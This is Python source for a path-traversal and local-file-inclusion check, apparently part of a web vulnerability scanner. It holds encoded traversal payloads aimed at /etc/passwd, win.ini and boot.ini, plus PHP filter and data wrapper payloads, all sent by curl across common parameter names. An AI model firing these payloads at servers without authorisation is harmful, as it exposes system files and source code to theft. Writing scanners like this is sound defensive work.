"""
Path traversal / Local File Inclusion detection with baseline comparison.

Design:
  1. Fetch a benign baseline (?param=1) and remember its body.
  2. For each payload:
     - Fetch; require that /etc/passwd (or Windows win.ini) indicator
       appears IN THE PAYLOAD RESPONSE but NOT in the baseline.
     - This prevents false positives on 404 pages that happen to contain
       "/etc/passwd" in prose.
  3. Confirm with a second shot and a wrapper variant.
"""
import time
import urllib.parse
from .base import BaseCheck
from ..models import Finding
from ..utils import run


class PathTraversalCheck(BaseCheck):
    """Multi-stage path-traversal / LFI probing with baseline comparison."""

    name = "Path Traversal"
    description = "Baseline-compared path traversal + LFI detection with filter-bypass variants"

    # Linux
    LINUX_PAYLOADS = [
        "../../../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "/etc/passwd",
        "/etc/passwd%00",
        "%2fetc%2fpasswd",
        "file:///etc/passwd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
    ]

    WIN_PAYLOADS = [
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:/Windows/win.ini",
        "....\\\\....\\\\....\\\\windows\\\\win.ini",
        "..%5c..%5c..%5cwindows%5cwin.ini",
        "C:\\boot.ini",
    ]

    PHP_WRAPPERS = [
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://filter/read=convert.base64-encode/resource=index.php",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
    ]

    LINUX_INDICATORS = [
        "root:x:0:0", "root:x:0:0:root:/root",
        "nobody:x:", "daemon:x:1:1",
        "sync:x:5:0:sync",
    ]
    WIN_INDICATORS = [
        "[fonts]", "[extensions]", "[mail]",
        "for 16-bit app support",
        "127.0.0.1       localhost",
    ]
    BASE64_PASSWD_PREFIX = ["cm9vdDp4OjA6", "cm9vdDoqOjA6"]

    PARAMS = [
        "file", "path", "page", "include", "src",
        "dir", "folder", "template", "doc", "document",
        "load", "read", "img", "image", "p", "name",
        "pg", "view", "content", "resource",
    ]

    def _fetch(self, url: str) -> str:
        rc, body, _ = run(["curl", "-sL", "--max-time", "6", url], timeout=10)
        return body if rc == 0 and body else ""

    def _url(self, base: str, param: str, value: str) -> str:
        return f"{base}?{param}={urllib.parse.quote(value, safe='')}"

    def _check_param(self, base: str, param: str) -> bool:
        baseline = self._fetch(self._url(base, param, "1"))
        if not baseline:
            return False
        baseline_lower = baseline.lower()

        payloads_by_group = [
            ("linux", self.LINUX_PAYLOADS, self.LINUX_INDICATORS),
            ("windows", self.WIN_PAYLOADS, self.WIN_INDICATORS),
        ]

        for group, payloads, indicators in payloads_by_group:
            for payload in payloads:
                url = self._url(base, param, payload)
                body = self._fetch(url)
                if not body or len(body) < 30:
                    continue
                for indicator in indicators:
                    if indicator in body and indicator not in baseline_lower \
                       and indicator.lower() not in baseline_lower:
                        time.sleep(0.3)
                        body2 = self._fetch(url)
                        if indicator in body2:
                            self.findings.append(Finding(
                                severity="critical",
                                title=f"Local File Inclusion ({group}) via '{param}'",
                                host=base,
                                detail=(
                                    f"Parameter '{param}' leaks {group} system file.\n"
                                    f"Indicator '{indicator}' absent from benign baseline, "
                                    f"present in both injected responses (double-confirmed)."
                                ),
                                source="path_traversal",
                                url=url,
                                tags=["lfi", "path-traversal", group,
                                      f"param:{param}"],
                                evidence=f"indicator={indicator} | payload={payload}",
                            ))
                            return True

        # PHP wrapper probing - base64-encoded /etc/passwd is distinctive
        for wrapper in self.PHP_WRAPPERS:
            url = self._url(base, param, wrapper)
            body = self._fetch(url)
            if not body or len(body) < 30:
                continue
            for prefix in self.BASE64_PASSWD_PREFIX:
                if prefix in body and prefix not in baseline:
                    self.findings.append(Finding(
                        severity="critical",
                        title=f"PHP Wrapper LFI via '{param}' (base64 /etc/passwd)",
                        host=base,
                        detail=(
                            f"PHP filter wrapper leaked base64-encoded /etc/passwd. "
                            f"Payload: {wrapper}"
                        ),
                        source="path_traversal",
                        url=url,
                        tags=["lfi", "php-wrapper", f"param:{param}"],
                        evidence=f"base64-prefix={prefix}",
                    ))
                    return True
        return False

    def execute(self) -> list[Finding]:
        for base in self._hosts():
            for param in self.PARAMS:
                try:
                    if self._check_param(base, param):
                        break
                except Exception as exc:
                    self.log.debug(f"  pathtrav {base} {param}: {exc}")
        return self.findings
